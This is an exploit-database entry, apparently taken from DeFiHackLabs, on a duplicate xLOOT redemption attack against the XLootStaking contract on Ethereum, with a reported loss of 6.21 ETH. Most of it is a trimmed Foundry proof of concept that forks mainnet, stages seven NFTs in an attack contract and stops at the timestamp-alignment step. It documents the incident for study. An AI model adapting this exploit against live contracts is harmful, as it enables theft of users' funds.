# [?] XLootStaking - Duplicate xLOOT Redemption

## Summary
Severity: Unknown
Chain: Ethereum
Component: XLootStaking
Published: 2026-04-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/XLootStaking_exp.sol
Type: defi-exploit-poc

## Details
Lost: 6.21 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IXLoot private constant xloot = IXLoot(XLOOT);
    IXLootStaking private constant staking = IXLootStaking(STAKING_PROXY);

    function setUp() public {
        uint256 forkBlock = 24_885_767;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(STAKING_PROXY, "xLOOT Staking Proxy");
        vm.label(XLOOT, "xLOOT NFT");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256[] memory baseIds = tracedXlootIds();
        XLootStakingAttack attack = new XLootStakingAttack(ATTACKER, baseIds);
        vm.label(address(attack), "Local Attack Contract");

        uint256 startingNextEpoch = staking.nextEpocId();
        for (uint256 i = 0; i < baseIds.length; ++i) {
            assertEq(xloot.ownerOf(baseIds[i]), ATTACKER, "attacker does not own xLOOT");
            assertEq(staking.xLootNextReem(baseIds[i]), startingNextEpoch - 1, "unexpected xLOOT redeem cursor");
        }

        // step 1: stage the same seven xLOOT NFTs into a fresh local helper.
        vm.startPrank(ATTACKER);
        for (uint256 i = 0; i < baseIds.length; ++i) {
            xloot.transferFrom(ATTACKER, address(attack), baseIds[i]);
        }
        vm.stopPrank();

        // step 2: match the attack block timestamp so receive() commits epoch 47.
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/XLootStaking_exp.sol_
